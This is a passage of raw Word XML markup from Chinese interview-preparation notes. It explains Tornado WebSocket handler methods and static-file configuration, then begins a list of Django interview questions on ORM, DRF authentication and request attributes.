          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C9111F"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这个类提供了和已连接的客户端通信的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>事件和方法的钩子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA2AAC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当一个新的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>连接打开时，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>open</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法被调用，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7D7572"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而</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>on_message</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>on_close</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法，分别在连接、接收到新的消息和客户端关闭时被调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610F6D41"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4B977401" w14:textId="4117EAD4"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此外，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WebSocketHandler</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类还提供了</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>write_message</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法用于向客户端发送消息，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>close</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法用于关闭连接。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E56CD0" w14:textId="2404440C" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00652BA5" w:rsidP="00652BA5">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="400" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>098</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Tornado</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中静态文件是如何处理的？</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>如：</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;link href="{{static_url("commons.css")}}" rel="stylesheet" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168C4D6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settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F81C966"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settings = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51182040"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"static_path": os.path.join(os.path.dirname(__file__), "static"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259A1B0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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>指定了静态文件的位置在当前目录中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>"static"</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>目录下</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240CBFD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"cookie_secret": "61oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1827F665"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"login_url": "/login",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50243404"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 xml:space="preserve">    "xsrf_cookies": True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EC678E"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634D6DDA"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p>
    <w:p w14:paraId="2C7C3809" w14:textId="77777777"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经上面配置后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B626029" w14:textId="50316839" w:rsidR="003942C2" w:rsidRPr="00BC0D9A" w:rsidRDefault="003942C2" w:rsidP="00BC0D9A">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C0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>static_url()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自动去配置的路径下找</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'commons.css'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DF0C49" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00D96E02" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="0" w:color="DDDDDD"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="33"/>
          <w:szCs w:val="33"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId182" w:history="1">
        <w:r w:rsidR="00717181" w:rsidRPr="00A52FA8">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="399AB2"/>
            <w:sz w:val="33"/>
            <w:szCs w:val="33"/>
          </w:rPr>
          <w:t xml:space="preserve">Django </w:t>
        </w:r>
        <w:r w:rsidR="00717181" w:rsidRPr="00A52FA8">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="399AB2"/>
            <w:sz w:val="33"/>
            <w:szCs w:val="33"/>
          </w:rPr>
          <w:t>必会面试题总结</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1541E830" w14:textId="22A07B90" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00467BDF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:del w:id="79" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="80" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>006</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>谈一谈你对</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C75390E" w14:textId="77777777" w:rsidR="00717181" w:rsidRDefault="00717181">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:pPrChange w:id="81" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:del w:id="82" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
        <w:r w:rsidDel="00717181">
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="581A89BA" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>ORM是“对象-关系-映射”的简称。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2294E4" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="83" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>MVC或者MVC框架中包括一个重要的部分，就是ORM，它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库，这极大的减轻了开发人员的工作量，不需要面对因数据库变更而导致的无效劳动</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B6AD06" w14:textId="77777777" w:rsidR="00717181" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:del w:id="84" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="85" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0494B87D" w14:textId="0153C2E1" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="86" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4AC6F871" w14:textId="285E3932" w:rsidR="00717181" w:rsidRDefault="00467BDF">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="87" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
          <w:pPr>
            <w:pStyle w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
            <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>007</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">rest_framework </w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>认证组件的流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9FEF5C" w14:textId="3B60AB75" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00717181" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="88" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#4.认证组件 写一个类并注册到认证类(authentication_classes)，在类的的authticate方法中编写认证逻</w:t>
      </w:r>
      <w:del w:id="89" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00717181">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="358EC742" w14:textId="22068FED" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="90" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
        <w:r w:rsidDel="00717181">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="417EFB67" w14:textId="3E06CBB9" w:rsidR="00717181" w:rsidRPr="00717181" w:rsidRDefault="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="91" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
              <w:color w:val="333333"/>
              <w:szCs w:val="21"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="92" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
          <w:pPr>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>013</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="93" w:author="ABM ABM" w:date="2020-08-16T13:40:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
              <w:b/>
              <w:bCs/>
              <w:color w:val="333333"/>
              <w:szCs w:val="21"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>视图函数中，接收的请求对象常用方法和属性有哪些</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7F82BF" w14:textId="43DC958B" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00D2274A" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>path属性，获取请求页面的全路径，不包括域名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C7BB8C" w14:textId="42A9AFEF" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00D2274A" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>method属性，获取请求中使用的HTTP方式的字符串表示。全大写表示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FDD23E" w14:textId="61781A18" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00D2274A" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
